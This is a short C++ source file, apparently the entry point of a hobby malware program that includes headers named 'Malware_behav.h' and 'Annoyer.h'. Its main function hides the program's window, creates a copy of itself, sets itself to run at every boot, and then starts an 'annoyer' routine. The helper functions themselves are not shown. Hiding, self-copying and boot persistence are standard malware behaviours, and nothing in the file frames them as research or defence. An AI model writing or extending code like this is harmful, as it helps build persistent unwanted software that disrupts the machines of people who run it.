#include "Main.h"
#include "Annoyer.h"
#include "Utils.h"
#include "Malware_behav.h"

int main()
{
	hide_window();
	srand((unsigned int)time(NULL)); // Set random generator
	create_copy();
	config_run_at_boot();
	Annoyer* annoyer = new Annoyer();
	annoyer->start_annoying();
}
